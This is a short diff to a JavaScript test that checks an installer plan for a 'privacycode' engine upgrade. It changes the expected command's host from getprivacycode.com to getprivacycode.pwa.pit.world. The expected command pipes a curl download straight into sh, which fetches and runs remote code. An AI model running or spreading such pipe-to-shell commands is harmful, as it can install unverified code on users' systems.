@@ -130,7 +130,7 @@ test("an explicit privacycode upgrade plans the installer", () => {
     {
       key: "privacycode",
       kind: "engine",
-      spec: { cmd: "sh", args: ["-c", "curl -fsSL https://getprivacycode.com/install | sh"] },
+      spec: { cmd: "sh", args: ["-c", "curl -fsSL https://getprivacycode.pwa.pit.world/install | sh"] },
     },
   ]);
 });
